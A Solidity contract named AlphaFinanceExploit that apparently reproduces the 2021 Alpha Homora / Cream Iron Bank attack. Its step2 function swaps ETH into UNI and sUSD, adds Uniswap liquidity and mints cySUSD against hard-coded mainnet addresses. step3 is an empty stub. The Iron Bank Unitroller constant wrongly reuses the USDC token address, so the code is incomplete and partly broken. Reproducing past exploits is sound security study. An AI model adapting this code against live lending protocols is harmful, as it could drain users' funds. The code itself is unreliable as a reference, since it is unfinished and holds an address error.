// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";
import "forge-std/console.sol";

interface IRouter { // uniswap v2 router interface
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface ICERC20 is IERC20{
    function mint(uint mintAmount) external returns (uint);
}

interface IUnitroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint[] memory);
}

interface IHomoraBank {
    function execute(
    uint positionId,
    address spell,
    bytes memory data
  ) external payable returns (uint);
}

contract AlphaFinanceExploit{
    IRouter constant uniswapV2Router02 = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IERC20 constant uni = IERC20(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);
    IERC20 constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant susd = IERC20(0x57Ab1ec28D129707052df4dF418D58a2D46d5f51);
    IERC20 constant weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUnitroller constant ironBankUnitroller = IUnitroller(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ICERC20 constant cySusd = ICERC20(0x4e3a36A633f63aee0aB57b5054EC78867CB3C0b8);
    IHomoraBank constant homoraBank = IHomoraBank(0x5f5Cd91070960D13ee549C9CC47e7a4Cd00457bb);
    
    fallback() external payable{}

    function step2() external payable {
        // 1 swaps ETH -> UNI
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(uni);
        uniswapV2Router02.swapExactETHForTokens{value: 0.5 ether}(
            1,
            path,
            address(this),
            1613195981
        );

        // 2 supply ETH + UNI to Uniswap pool
        uni.approve(address(uniswapV2Router02), type(uint256).max);
        uint256 uniAmount = uni.balanceOf(address(this));
        uniswapV2Router02.addLiquidityETH{value: 0.5 ether}(address(uni), uniAmount, 1, 1, address(this), 1613195981);

        // 3 swap ETH -> sUSD 
        path[1] = address(susd);
        uniswapV2Router02.swapExactETHForTokens{value: 0.5 ether}(1, path, address(this), 1613195981);
        
        // 4 deposit sUSD to Creamâ€™s Iron Bank (getting cysUSD)
        susd.approve(address(cySusd), type(uint256).max);
        uint256 susdAmount = susd.balanceOf(address(this));
        require(susdAmount > 894386566919930349147, "susd amount not enough");
        cySusd.mint(894386566919930349147);
    }

    function step3() external {
        // console.log("in step3!!!");
        
    }

    function test() external {
        console.log("msg.sender = %s", msg.sender);
        console.log("tx.origin = %s", tx.origin);
    }

}